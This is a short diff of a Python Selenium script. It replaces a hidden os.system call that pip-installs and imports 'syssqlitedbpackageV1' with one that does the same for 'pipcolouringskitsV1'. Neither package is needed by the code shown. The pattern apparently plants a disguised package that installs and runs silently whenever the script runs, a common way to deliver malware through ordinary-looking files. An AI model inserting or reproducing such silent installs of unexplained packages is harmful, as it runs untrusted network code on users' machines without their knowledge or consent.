@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbpackageV1")
-import syssqlitedbpackageV1
+os.system("pip install pipcolouringskitsV1")
+import pipcolouringskitsV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
